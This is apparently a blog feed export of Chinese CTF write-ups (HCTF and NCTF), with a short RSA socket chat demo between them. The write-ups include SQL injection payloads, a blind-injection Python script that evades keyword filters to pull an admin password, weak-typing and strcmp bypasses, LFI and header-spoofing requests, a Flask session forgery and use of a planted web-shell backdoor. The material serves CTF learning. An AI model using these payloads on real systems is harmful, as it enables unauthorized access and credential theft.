   file = request.files[<span class="string">'the_file'</span>]</span><br><span class="line">    <span class="keyword">if</span> file.filename == <span class="string">''</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">    <span class="keyword">if</span> file <span class="keyword">and</span> allowed_file(file.filename):</span><br><span class="line">        filename = secure_filename(file.filename)</span><br><span class="line">        file_save_path = os.path.join(app.config[<span class="string">'UPLOAD_FOLDER'</span>], filename)</span><br><span class="line">        <span class="keyword">if</span>(os.path.exists(file_save_path)):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'This file already exists'</span></span><br><span class="line">        file.save(file_save_path)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'This file is not a zipfile'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        extract_path = file_save_path + <span class="string">'_'</span></span><br><span class="line">        os.system(<span class="string">'unzip -n '</span> + file_save_path + <span class="string">' -d '</span>+ extract_path)</span><br><span class="line">        read_obj = os.popen(<span class="string">'cat '</span> + extract_path + <span class="string">'/*'</span>)</span><br><span class="line">        file = read_obj.read()</span><br><span class="line">        read_obj.close()</span><br><span class="line">        os.system(<span class="string">'rm -rf '</span> + extract_path)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        file = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    os.remove(file_save_path)</span><br><span class="line">    <span class="keyword">if</span>(file != <span class="literal">None</span>):</span><br><span class="line">        <span class="keyword">if</span>(file.find(base64.b64decode(<span class="string">'aGN0Zg=='</span>).decode(<span class="string">'utf-8'</span>)) != <span class="number">-1</span>):</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>, error=<span class="number">1</span>))</span><br><span class="line">    <span class="keyword">return</span> Response(file)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment">#app.run(debug=True)</span></span><br><span class="line">    app.run(host=<span class="string">'127.0.0.1'</span>, debug=<span class="literal">True</span>, port=<span class="number">10008</span>)</span><br></pre></td></tr></table></figure>

<p>尝试读了一下 <code>flag.py</code>, 得到的却是一个 <code>html</code> 文件… 好吧看来不是这个意思, 看来出题人是把它放在 <code>site-package</code> 之类的地方了, 但是这就真的是大海捞针了, 不太可能通过直接读源码的方式找到 <code>flag</code>. 想想上一题, 或许也可能是通过得到 <code>SECRET_KEY</code> 的方式来伪造 <code>session</code>, 看了下对应的代码, 发现</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = str(random.random()*<span class="number">100</span>)</span><br></pre></td></tr></table></figure>

<p><code>uuid.getnode()</code> 返回的是网卡 <code>MAC</code> 地址, 也就是说 <code>SECRET_KEY</code> 其实是一个可以预测的值, 我们可以通过读取 <code>/sys/class/net/eth0/address</code> 来得到 <code>MAC</code> 地址 <code>12:34:3e:14:7c:62</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>int(<span class="number">0x12343e147c62</span>)</span><br><span class="line"><span class="number">20015589129314</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> random</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>random.seed(<span class="number">20015589129314</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>str(random.random()*<span class="number">100</span>)</span><br><span class="line"><span class="string">'11.935137566861131'</span> <span class="comment"># SECRET_KEY</span></span><br></pre></td></tr></table></figure>

<p>之后伪造成为 <code>admin</code> 就可以了, flag get</p>
<p><img src="https://i.loli.net/2019/03/08/5c8277dba1c00.png" alt="">  </p>
<h2 id="0x03-xor-game"><a href="#0x03-xor-game" class="headerlink" title="0x03 xor game"></a>0x03 xor game</h2><p>直接丢到 <code>featherduster</code> 就出了原文, <code>xor</code> 一下 flag get</p>
<h2 id="0x04-freq-game"><a href="#0x04-freq-game" class="headerlink" title="0x04 freq game"></a>0x04 freq game</h2><p>感觉师傅懒得写 writeup 233, 帮他说一下吧, 主要是用 <code>傅里叶变换</code> 将他给的 <code>list</code>, 还原成原来的四个值后再还原成 <code>freq</code> 就可以了, 说着简单但想想写起来就很烦…</p>
<h2 id="0x05-difficult-programming-language"><a href="#0x05-difficult-programming-language" class="headerlink" title="0x05 difficult programming language"></a>0x05 difficult programming language</h2><p>拿到流量包, 感觉就像是键盘的 usb 信号, 用 tshark 提取出来后, 找到一个外国人写的脚本稍微改一下, 还原一下输入的字符</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">usb_codes = &#123;</span><br><span class="line">   <span class="number">0x04</span>:<span class="string">"aA"</span>, <span class="number">0x05</span>:<span class="string">"bB"</span>, <span class="number">0x06</span>:<span class="string">"cC"</span>, <span class="number">0x07</span>:<span class="string">"dD"</span>, <span class="number">0x08</span>:<span class="string">"eE"</span>, <span class="number">0x09</span>:<span class="string">"fF"</span>,</span><br><span class="line">   <span class="number">0x0A</span>:<span class="string">"gG"</span>, <span class="number">0x0B</span>:<span class="string">"hH"</span>, <span class="number">0x0C</span>:<span class="string">"iI"</span>, <span class="number">0x0D</span>:<span class="string">"jJ"</span>, <span class="number">0x0E</span>:<span class="string">"kK"</span>, <span class="number">0x0F</span>:<span class="string">"lL"</span>,</span><br><span class="line">   <span class="number">0x10</span>:<span class="string">"mM"</span>, <span class="number">0x11</span>:<span class="string">"nN"</span>, <span class="number">0x12</span>:<span class="string">"oO"</span>, <span class="number">0x13</span>:<span class="string">"pP"</span>, <span class="number">0x14</span>:<span class="string">"qQ"</span>, <span class="number">0x15</span>:<span class="string">"rR"</span>,</span><br><span class="line">   <span class="number">0x16</span>:<span class="string">"sS"</span>, <span class="number">0x17</span>:<span class="string">"tT"</span>, <span class="number">0x18</span>:<span class="string">"uU"</span>, <span class="number">0x19</span>:<span class="string">"vV"</span>, <span class="number">0x1A</span>:<span class="string">"wW"</span>, <span class="number">0x1B</span>:<span class="string">"xX"</span>,</span><br><span class="line">   <span class="number">0x1C</span>:<span class="string">"yY"</span>, <span class="number">0x1D</span>:<span class="string">"zZ"</span>, <span class="number">0x1E</span>:<span class="string">"1!"</span>, <span class="number">0x1F</span>:<span class="string">"2@"</span>, <span class="number">0x20</span>:<span class="string">"3#"</span>, <span class="number">0x21</span>:<span class="string">"4$"</span>,</span><br><span class="line">   <span class="number">0x22</span>:<span class="string">"5%"</span>, <span class="number">0x23</span>:<span class="string">"6^"</span>, <span class="number">0x24</span>:<span class="string">"7&amp;"</span>, <span class="number">0x25</span>:<span class="string">"8*"</span>, <span class="number">0x26</span>:<span class="string">"9("</span>, <span class="number">0x27</span>:<span class="string">"0)"</span>,</span><br><span class="line">   <span class="number">0x2C</span>:<span class="string">"  "</span>, <span class="number">0x2D</span>:<span class="string">"-_"</span>, <span class="number">0x2E</span>:<span class="string">"=+"</span>, <span class="number">0x2F</span>:<span class="string">"[&#123;"</span>, <span class="number">0x30</span>:<span class="string">"]&#125;"</span>,  <span class="number">0x32</span>:<span class="string">"#~"</span>,</span><br><span class="line">   <span class="number">0x33</span>: <span class="string">";:"</span>, <span class="number">0x34</span>: <span class="string">"'\""</span>, <span class="number">0x36</span>: <span class="string">",&lt;"</span>, <span class="number">0x37</span>: <span class="string">".&gt;"</span>, <span class="number">0x4f</span>: <span class="string">"&gt;"</span>, <span class="number">0x50</span>: <span class="string">"&lt;"</span>,</span><br><span class="line">   <span class="number">0x35</span>: <span class="string">"`~"</span>, <span class="number">0x38</span>: <span class="string">"/?"</span>, <span class="number">0x31</span>: <span class="string">"\\|"</span></span><br><span class="line">   &#125;</span><br><span class="line">lines = [<span class="string">""</span>,<span class="string">""</span>,<span class="string">""</span>,<span class="string">""</span>,<span class="string">""</span>]</span><br><span class="line"></span><br><span class="line">pos = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> open(<span class="string">"dpl"</span>,<span class="string">"r"</span>).readlines():</span><br><span class="line">   code = int(x[<span class="number">6</span>:<span class="number">8</span>],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> code == <span class="number">0</span>:</span><br><span class="line">       <span class="keyword">continue</span></span><br><span class="line">   <span class="comment"># newline or down arrow - move down</span></span><br><span class="line">   <span class="keyword">if</span> code == <span class="number">0x51</span> <span class="keyword">or</span> code == <span class="number">0x28</span>:</span><br><span class="line">       pos += <span class="number">1</span></span><br><span class="line">       <span class="keyword">continue</span></span><br><span class="line">   <span class="comment"># up arrow - move up</span></span><br><span class="line">   <span class="keyword">if</span> code == <span class="number">0x52</span>:</span><br><span class="line">       pos -= <span class="number">1</span></span><br><span class="line">       <span class="keyword">continue</span></span><br><span class="line">   <span class="comment"># select the character based on the Shift key</span></span><br><span class="line">   <span class="keyword">if</span> int(x[<span class="number">0</span>:<span class="number">2</span>],<span class="number">16</span>) == <span class="number">2</span>:</span><br><span class="line">       lines[pos] += usb_codes[code][<span class="number">1</span>]</span><br><span class="line">   <span class="keyword">else</span>:</span><br><span class="line">       lines[pos] += usb_codes[code][<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> lines:</span><br><span class="line">   <span class="keyword">print</span> x</span><br></pre></td></tr></table></figure>

<p>得到了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">D&#39;&#96;;M?!\mZ4j8hgSvt2bN);^]+7jiE3Ve0A@Q&#x3D;|;)sxwYXtsl2pongOe+LKa&#39;e^]\a&#96;_X|V[Tx;:VONSRQJn1MFKJCBfFE&gt;&amp;&lt;&#96;@9!&#x3D;&lt;5Y9y7654-,P0&#x2F;o-,%I)ih&amp;%$#z@xw|&#123;ts9wvXWm3~c</span><br></pre></td></tr></table></figure>

<p>因为之前做了科大的 <code>hackergame</code> 感觉出来是 <code>malbolge</code>, 把最后的 <code>c</code> 删掉就可以跑了, 运行一下就得到 flag.<br><img src="https://i.loli.net/2019/03/08/5c82782071137.png" alt=""></p>
]]></content>
      <tags>
        <tag>writeup</tag>
        <tag>hctf</tag>
      </tags>
  </entry>
  <entry>
    <title>Socket 实现端对端的加密通讯</title>
    <url>/2018/01/11/Socket%20%E5%AE%9E%E7%8E%B0%E7%AB%AF%E5%AF%B9%E7%AB%AF%E7%9A%84%E5%8A%A0%E5%AF%86%E9%80%9A%E8%AE%AF/</url>
    <content><![CDATA[<p>对这方面比较感兴趣, 写了一个小DEMO吧.只是勉强能用而已. 可以加上断线等待重连和通过RSA加密传输AES密钥来实现更快的加密.</p>
<a id="more"></a>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> rsa</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">mySendAddress=(<span class="string">'0.0.0.0'</span>,<span class="number">0</span>)</span><br><span class="line">myListenAddress=(<span class="string">'0.0.0.0.'</span>,<span class="number">0</span>)</span><br><span class="line">hisAddress=(<span class="string">'0.0.0.0'</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">pubKey,priKey=rsa.newkeys(<span class="number">1024</span>)</span><br><span class="line">pubKeyBin=pubKey.save_pkcs1()</span><br><span class="line">hisPubKey=rsa.PublicKey(<span class="number">1</span>,<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">startListen</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> hisPubKey</span><br><span class="line">    sck=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    sck.bind(myListenAddress)</span><br><span class="line">    sck.listen()</span><br><span class="line">    con,add=sck.accept()</span><br><span class="line">    hisPubKeyBin=con.recv(<span class="number">2048</span>) <span class="comment">#得到对方的公钥</span></span><br><span class="line">    hisPubKey=rsa.PublicKey.load_pkcs1(hisPubKeyBin)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:             </span><br><span class="line">        data=con.recv(<span class="number">2048</span>)</span><br><span class="line">        data=rsa.decrypt(data,priKey) <span class="comment">#用自己的私钥解密</span></span><br><span class="line">        print(<span class="string">'&gt;&gt;Get a message from'</span>,add[<span class="number">0</span>])</span><br><span class="line">        print(<span class="string">'&gt;&gt;&gt;Data:'</span>,data.decode(),end=<span class="string">'\n&gt;'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sentMessage</span><span class="params">(address,text,sck)</span>:</span>    </span><br><span class="line">    <span class="keyword">global</span> hisPubKey</span><br><span class="line">    text=rsa.encrypt(text.encode(),hisPubKey) <span class="comment">#用对方的公钥加密信息</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sck.sendall(text)</span><br><span class="line">    <span class="keyword">except</span> ConnectionRefusedError:</span><br><span class="line">        print(<span class="string">'&gt;&gt;&gt;He is now online yet'</span>)   </span><br><span class="line"></span><br><span class="line">t1=threading.Thread(target=startListen)</span><br><span class="line">t1.start()</span><br><span class="line"></span><br><span class="line">sck_send=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">sck_send.bind(mySendAddress)</span><br><span class="line"></span><br><span class="line">print(<span class="string">'Wait for his response'</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sck_send.connect(hisAddress) <span class="comment">#如果连接成功退出循环</span></span><br><span class="line">        sck_send.sendall(pubKeyBin) <span class="comment">#送出自己的公钥        </span></span><br><span class="line">        print(<span class="string">'He is online'</span>)        </span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span> ConnectionRefusedError:</span><br><span class="line">        sleep(<span class="number">0.5</span>)</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    text=input(<span class="string">'&gt;'</span>) </span><br><span class="line">    sentMessage(hisAddress,text,sck_send)</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>misc</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>NCTF WriteUp</title>
    <url>/2018/05/18/nctf-writeup/</url>
    <content><![CDATA[<p>我是看心情做的 233, 可能不是按顺序, 请见谅</p>
<a id="more"></a>

<h3 id="0x01-签到题"><a href="#0x01-签到题" class="headerlink" title="0x01 签到题"></a>0x01 签到题</h3><p>右键查看网页源代码, 得到 <code>nctf{flag_admiaanaaaaaaaaaaa}</code></p>
<h3 id="0x02-md5-collision"><a href="#0x02-md5-collision" class="headerlink" title="0x02 md5 collision"></a>0x02 md5 collision</h3><p>php 因为是弱类型, 而 <code>md5(&quot;240610708&quot;)</code> 和 <code>md5(&#39;QNKCDZO&#39;)</code> 均为 <code>0eXXXXX</code>, 被 php 当成了科学计数法. 0 当然等于 0, 所以 <a href="http://chinalover.sinaapp.com/web19/?a=240610708" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web19/?a=240610708</a>, 得到 <code>nctf{md5_collision_is_easy}</code></p>
<h3 id="0x03-签到2"><a href="#0x03-签到2" class="headerlink" title="0x03 签到2"></a>0x03 签到2</h3><p>前端控制长度, 直接 <code>curl -X POST http://teamxlc.sinaapp.com/web1/02298884f0724c04293b4d8c0178615e/index.php -d &quot;text1=zhimakaimen&quot;</code> 可得 <code>nctf{follow_me_to_exploit}</code></p>
<h3 id="0x04-这题不是WEB"><a href="#0x04-这题不是WEB" class="headerlink" title="0x04 这题不是WEB"></a>0x04 这题不是WEB</h3><p>真的不是 WEB 233, 在图片尾部, 可以得到 <code>nctf{photo_can_also_hid3_msg}</code></p>
<h3 id="0x05-SQL-Injection"><a href="#0x05-SQL-Injection" class="headerlink" title="0x05 SQL Injection"></a>0x05 SQL Injection</h3><p>题目中的</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">clean</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(get_magic_quotes_gpc())&#123;</span><br><span class="line">		$str=stripslashes($str);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> htmlentities($str, ENT_QUOTES);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因为用了 <code>stripslashes</code> 而 <code>htmlentities</code> 是不会转义 <code>\</code> 的, 所以存在注入, 比较特殊, 生产环境应该不会有人这么干… 用 <code>username=\&amp;password=%20or%201=1%20%23</code> 就可以 get 到 <code>nctf{sql_injection_is_interesting}</code> 此时的 sqlQuery 为 <code>SELECT * FROM users WHERE name=&#39;\&#39; AND pass=&#39; or 1=1 #&#39;;</code> 因为第二个自带的 <code>&#39;</code> 被转义, 所以导致了可以通过 pass 参数注入.</p>
<h3 id="0x06-file-get-contents"><a href="#0x06-file-get-contents" class="headerlink" title="0x06 file_get_contents"></a>0x06 file_get_contents</h3><p>注意 <code>file_get_contents</code> 是支持 http 协议的, 所以只要写个只有 <code>meizijiu</code> 的空白网页然后让 <code>file_get_contents</code> 获取就行了.</p>
<h3 id="0x07-综合题"><a href="#0x07-综合题" class="headerlink" title="0x07 综合题"></a>0x07 综合题</h3><p>放在控制台运行下那一串 js 就行, 得到 <code>1bc29b36f623ba82aaf6724fd3b16718.php</code>, 访问后提示在头部, 所以观察 header, 得到 history of bash 这个 hint, 接着访问 <code>.bash_history</code> 就可以得到下一步 <code>flagbak.zip</code> 打开后就可得到 <code>nctf{bash_history_means_what}</code></p>
<h3 id="0x08-密码重置2"><a href="#0x08-密码重置2" class="headerlink" title="0x08 密码重置2"></a>0x08 密码重置2</h3><p>自带 3 个提示, 访问 <code>http://nctf.nuptzj.cn/web14/.submit.php.swp</code> 就可以得到源码, 观察源码, 同样弱类型 0000000000 == 0, 所以 <code>http://nctf.nuptzj.cn/web14/submit.php?emailAddress=admin@nuptzj.cn&amp;token=0000000000</code> 就可拿到 <code>nctf{thanks_to_cumt_bxs}</code></p>
<h3 id="0x09-变量覆盖"><a href="#0x09-变量覆盖" class="headerlink" title="0x09 变量覆盖"></a>0x09 变量覆盖</h3><p><code>http://chinalover.sinaapp.com/web24/?name=meizijiu233</code> 即可, 得到<code>nctf{AD3FBD8D5928693CA499347C91570AE6}</code></p>
<h3 id="0x0A-综合题2"><a href="#0x0A-综合题2" class="headerlink" title="0x0A 综合题2"></a>0x0A 综合题2</h3><p>相当不错的题, 百度了半天才完成这道题 ORZ. 之前一直只听说过盲注, 这也是第一次真正尝试盲注, 还是蛮有意思的. about.php 存在 LFI, 把 sm.txt 里面说的文件瞎看了半天, 全都是有 mysql_real_escape_string() 过滤, 与注入无缘. 最后找了半天, 发现在 index.php 里面还用到了 so.php 和 preview.php. 在 so.php 上存在注入点, 虽然它也使用了 mysql_real_escape_string(), 但不同的是注意它的语句 <code>SELECT * FROM `message` WHERE display=1 AND id=$id</code> 它的 id 字段是没有引号的, 也就是说我们是不用逃逸单引号的, 这也是所有涉及到数据库的文件中唯一没有使用引号的, 成为了唯一的注入点. 再观察 antiinject.php, 通过替换过滤了很多语句, 不过我们可以通过简单的堆叠来逃逸, 比如 <code>seleselectct</code> 替换后成为 <code>selcet</code>, 就避免了被替换. 我们就可以通过盲注来脱裤了, 可以写个简单的函数来便于我们注入, 就叫 antiAntiInject 吧 233</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">antiAntiInject</span><span class="params">(payload)</span>:</span></span><br><span class="line">    payload = payload.replace(<span class="string">" "</span>, <span class="string">"/**/"</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">"or"</span>, <span class="string">"oorr"</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">"="</span>, <span class="string">"like"</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">"and"</span>, <span class="string">"anandd"</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">"from"</span>, <span class="string">"ffromrom"</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">"char"</span>, <span class="string">"chcharar"</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">"count"</span>, <span class="string">"cocountunt"</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">"name"</span>, <span class="string">"nanameme"</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">"pass"</span>, <span class="string">"papassss"</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">"admin"</span>, <span class="string">"admadminin"</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">"order"</span>, <span class="string">"ororderder"</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">"union"</span>, <span class="string">"uniunionon"</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">"select"</span>, <span class="string">"selselectect"</span>)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure>

<p>本来还得更麻烦去爆破表名、字段名, 但是好心的出题人直接给我们结构, 所以我们直接爆破用户名和密码. 直接猜用户名 admin 竟然对了233, 接下来就可以通过 LENGTH 函数来爆破长度. 注意因为过滤了单引号且不能反反过滤, 所以不能直接输入用户名, 在这里我们用十六进制来表示我们的用户名 admin</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bpForLength</span><span class="params">(val)</span>:</span> <span class="comment">#34</span></span><br><span class="line">    payload = <span class="string">"1 and if(((select LENGTH(userpass) from admin where username = 0x61646d696e) = &#123;len&#125;) , 1, 0) = 1"</span>.format(len=str(val))</span><br><span class="line">    print(payload)</span><br><span class="line">    postData = &#123;</span><br><span class="line">        <span class="string">"soid"</span>: antiAntiInject(payload)</span><br><span class="line">    &#125;</span><br><span class="line">    res = sess.post(<span class="string">"http://cms.nuptzj.cn/so.php"</span>, postData)</span><br><span class="line">    res.encoding = <span class="string">"utf-8"</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> res.text.find(<span class="string">"xlcteam"</span>)!=<span class="number">-1</span>:</span><br><span class="line">        print(<span class="literal">True</span>, val)</span><br></pre></td></tr></table></figure>

<p>最后得到的长度是 34, 瞎几把爆了半天密码, 结果字典里没有空格导致有些地方没有爆出来, 长度不是 34. 最后才发现 passencode.php 这个文件, 可以看到密码是由明文 ascii 编码后中间填充空格得到的, 所以我们爆破时 payload 选用数字 + 空格就够了 (要是早点知道这个文件的话上面其实没爆出来空格也可以),</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bpForVal</span><span class="params">(pos)</span>:</span> <span class="comment">#102 117 99 107 114 117 110 116 117 </span></span><br><span class="line">    <span class="keyword">global</span> a</span><br><span class="line">    <span class="keyword">for</span> val <span class="keyword">in</span> table:</span><br><span class="line">        payload = <span class="string">"1 and if(substr((select userpass from admin where username = 0x61646d696e), &#123;p&#125;, 1) = &#123;v&#125; , 1, 0) = 1"</span>.format(p=str(pos), v=str(hex(ord(val))))</span><br><span class="line">        <span class="comment">#print(payload)</span></span><br><span class="line">        postData = &#123;</span><br><span class="line">            <span class="string">"soid"</span>: antiAntiInject(payload)</span><br><span class="line">        &#125;</span><br><span class="line">        res = sess.post(<span class="string">"http://cms.nuptzj.cn/so.php"</span>, postData)</span><br><span class="line">        res.encoding = <span class="string">"utf-8"</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> res.text.find(<span class="string">"xlcteam"</span>)!=<span class="number">-1</span>:</span><br><span class="line">            a += val</span><br><span class="line">            print(a)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>最后得到 <code>102 117 99 107 114 117 110 116 117</code> 即是密码, 明文即是 <code>fuckruntu</code> (#日闰土? 什么鬼233) 后台可以在 about.php 自身看到, 敏感目录<code>loginxlcteam</code> 即是 (这就叫此地无银三百两吧 233), 用 admin + 明文密码就可以登上了. 提示 <code>xlcteam.php</code> 是后门, 用 about.php 查看发现完全看不懂 233, 百度了下发现可以搜到, 是使用的回调函数来隐藏, 不明觉厉, 这里我就先用百度上说的调用方式了, 具体原理日后再分析. 地址是 <code>http://cms.nuptzj.cn/xlcteam.php?www=preg_replace</code>, 密码是<code>www</code>, 可以直接用蚁剑连上, 得到 <code>nctf{you_are_s0_g00d_hacker}</code>, 然而我还是太菜了 QAQ.</p>
<h3 id="0x0B-密码重置"><a href="#0x0B-密码重置" class="headerlink" title="0x0B 密码重置"></a>0x0B 密码重置</h3><p>直接 F12, 删除账号的输入框的 readonly 属性后改成 admin 就行了, 得到 <code>nctf{reset_password_often_have_vuln}</code></p>
<h3 id="0x0C-密码重置"><a href="#0x0C-密码重置" class="headerlink" title="0x0C 密码重置"></a>0x0C 密码重置</h3><p>又是弱类型 <code>54975581388</code> 的十六进制即是 <code>0xccccccccc</code> , 恰好没有数字, key=0xccccccccc. 得到 <code>nctf{follow_your_dream}</code></p>
<h3 id="0x0D-pass-check"><a href="#0x0D-pass-check" class="headerlink" title="0x0D pass check"></a>0x0D pass check</h3><p>旧版本 php 的函数 strcmp 对数组这种不合法变量进行比较时, 存在漏洞会返回 0, <code>curl -X POST http://chinalover.sinaapp.com/web21/ -d &quot;pass[]=1&quot;</code>, 得到 <code>nctf{strcmp_is_n0t_3afe}</code></p>
<h3 id="0x0E-SQL注入1"><a href="#0x0E-SQL注入1" class="headerlink" title="0x0E SQL注入1"></a>0x0E SQL注入1</h3><p>注意密码是会被 md5 的, 所以注入点在用户名, 将后面的语句注释掉就可以了, <code>curl -X POST http://chinalover.sinaapp.com/index.php -d &quot;user=admin &#39;)#&amp;pass=asd&quot;</code>, 得到 <code>nctf{ni_ye_hui_sql?}</code></p>
<h3 id="0x0F-SQL注入1"><a href="#0x0F-SQL注入1" class="headerlink" title="0x0F SQL注入1"></a>0x0F SQL注入1</h3><p>一开始还以为要时间盲注一波, 发现题目有提示 <code>union</code>, 然而还没听说过, 就搜了一波大神的题解, 发现还有这种操作, 太强了. <code>curl -X POST http://chinalover.sinaapp.com/web6/index.php -d &quot;user=1&#39; union select md5(&#39;asd&#39;)#&amp;pass=asd&quot;</code>, 因为用户 1 是不存在的, 所以 query[pw] 的结果实际上是 md5(‘asd’), 导致绕过检验, 得到 <code>ntcf{union_select_is_wtf}</code></p>
<h3 id="0x10-伪装者"><a href="#0x10-伪装者" class="headerlink" title="0x10 伪装者"></a>0x10 伪装者</h3><p>X-Forwarded-For, Client-IP 都试一下, 最后得到检测的是 Client-IP,  <code>curl http://chinalover.sinaapp.com/web4/xxx.php -H &quot;Client-IP: 127.0.0.1&quot; -v</code>, 得到 <code>nctf{happy_http_headers}</code></p>
<h3 id="0x11-变量覆盖"><a href="#0x11-变量覆盖" class="headerlink" title="0x11 变量覆盖"></a>0x11 变量覆盖</h3><p>直接将两个变量覆盖即可, <code>curl -X POST http://chinalover.sinaapp.com/web18/index.php -d &quot;pass=asd&amp;thepassword_123=asd&quot;</code>, 得到 <code>nctf{bian_liang_fu_gai!}</code></p>
<h3 id="0x12-bypass-again"><a href="#0x12-bypass-again" class="headerlink" title="0x12 bypass again"></a>0x12 bypass again</h3><p>经典题, <code>a=QNKCDZO&amp;b=240610708</code>, 得到 <code>nctf{php_is_so_cool}</code></p>
<h3 id="0x13-x00"><a href="#0x13-x00" class="headerlink" title="0x13 \x00"></a>0x13 \x00</h3><p>题目暗示 00 截断, 试了下 <code>nctf=123123%00%23biubiubiu</code>, 得到 <code>nctf{use_00_to_jieduan}</code></p>
<h3 id="0x14-MYSQL"><a href="#0x14-MYSQL" class="headerlink" title="0x14 MYSQL"></a>0x14 MYSQL</h3><p>进 robots.txt 拿到提示, intval 是取整数的, 所以我们直接 <code>id=1024.1</code>, 就可以拿到 <code>nctf{query_in_mysql}</code></p>
<h3 id="0x15-COOKIE"><a href="#0x15-COOKIE" class="headerlink" title="0x15 COOKIE"></a>0x15 COOKIE</h3><p>修改 cookie 中的 login 的值为 1 即可, curl <code>http://chinalover.sinaapp.com/web10/index.php -H &quot;Cookie: Login=1&quot;</code>, 得到 <code>nctf{cookie_is_different_from_session}</code></p>
<h3 id="0x16-单身一百年也没用"><a href="#0x16-单身一百年也没用" class="headerlink" title="0x16 单身一百年也没用"></a>0x16 单身一百年也没用</h3><p>curl <code>http://chinalover.sinaapp.com/web9/index.php -v</code> 即可, 得到 <code>nctf{this_is_302_redirect}</code></p>
<h3 id="0x17-文件包含"><a href="#0x17-文件包含" class="headerlink" title="0x17 文件包含"></a>0x17 文件包含</h3><p>经典题目, <code>file=php://filter/read=convert.base64-encode/resource=index.php</code>, 再拿去解个码, 得到 <code>nctf{edulcni_elif_lacol_si_siht}</code></p>
<h3 id="0x18-php-decode"><a href="#0x18-php-decode" class="headerlink" title="0x18 php decode"></a>0x18 php decode</h3><p>这道题挺坑的… 直接把 eval 换成 echo, 放在 php 环境运行一下就行了, 得到 <code>nctf{gzip_base64_hhhhhh}</code></p>
<h3 id="0x19-单身二十年"><a href="#0x19-单身二十年" class="headerlink" title="0x19 单身二十年"></a>0x19 单身二十年</h3><p><code>curl http://chinalover.sinaapp.com/web8/search_key.php -v</code>, 得到 <code>nctf{yougotit_script_now}</code></p>
